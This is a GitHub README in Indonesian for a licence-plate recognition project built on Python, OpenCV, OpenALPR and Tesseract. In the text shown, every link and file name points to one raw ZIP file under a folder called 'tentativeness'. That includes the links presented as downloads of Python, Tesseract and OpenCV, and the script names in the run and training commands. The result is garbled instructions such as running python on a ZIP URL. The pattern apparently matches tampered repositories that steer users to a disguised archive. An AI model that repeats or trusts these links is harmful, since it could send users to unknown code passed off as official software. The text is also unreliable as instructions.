# ALPR-Project
Project untuk mendeteksi dan membaca nomor plat Indonesia

![Gambar ALPR](https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip)

Plate Number Recognition adalah aplikasi yang di tulis dalam python, opencv, openalpr dan Tesseract. Aplikasi ini dapat menganalisis gambar maupun video yang di dalamnya terdapat gambar plat yang kemudian di identifikasikan dengan output string.

### Depedencies :

-	[Python](https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip)

-	[Tesseract v 4.00](https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip )

-	[Openalpr]( https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip )

-	[OpenCV v3.4.1](https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip )

-	[Project ALPR Indonesia](https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip )

### Usage :
1. Mengatur masukan source yang akan dideteksi pada file https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip

   Line 19-20	: Masukan berupa video stream
   
   Line 21	   : Masukan berupa video maupun gambar
   
   Line 22	   : Masukan berupa video dari webcam PC

2.	Menjalan aplikasi menggunakan terminal(ubuntu)/CMD(windows) di dalam direktori aplikasi command: $ python https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip


## Cara untuk menambahkan sampel foto ke train detector:
   
1. Download [repositorynya](https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip)

2. Crop plat pada foto

3. Hasil crop tersebut diberi nama sesuai dengan nomor plat yang di crop seperti contoh,anda sedang memotong foto untuk plat AB 4413   DW, maka hasil tersebut diberi nama “AB4413DW”,dan harus konsisten memberi format gambar jika JPG maka JPG semua jika PNG maka PNG         semua
4. Kemudian hasil crop di masukan di 1 folder yang sama

5. Kemudian Edit file https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip ,kemudian ke Line-31 edit menjadi “BASE_DIT + [Folder tempat menyimpan hasil crop] +’/’ ”

6. Kemudian buka terminal di directory train-detector

7. Jalankan command-command ini:
```
      •	rm ./out/* (Menghapus isi directory ‘out’)
   
      •	https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip neg (menyiapkan gambar negatif)
   
      •	https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip pos (menyiapkan gambar positif)
   
      •	https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip train (mempersiapkan training data)
   
      •	Setelah https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip dijalankan maka terdapat command yang siap dijalankan kembali,lalu copy-paste command tersebut, sebelum dijalankan command tersebut ubahlah stages menjadi maksimal 11, kemudian ubah nilai numPos ¼ dari total gambar yang ingin di train kemudian enter.
   
      •	Kemudian hasil dari train tersebut bisa di lihat di directory out, kemudian copy https://raw.githubusercontent.com/fatahfd/ALPR-Project/master/tentativeness/ALPR-Project.zip ke runtime anda.
```
   
> Kekurangan dari aplikasi ini adalah kurangnya keakuratan dari pendeteksian plat itu, penyebabnya adalah kurangnya sampel foto plat yang saat ini di gunakan baru sekitar 2400 sampel foto yang jika di lihat dari sampel foto negara yang sudah jadi sekitar 8000 sampel foto.
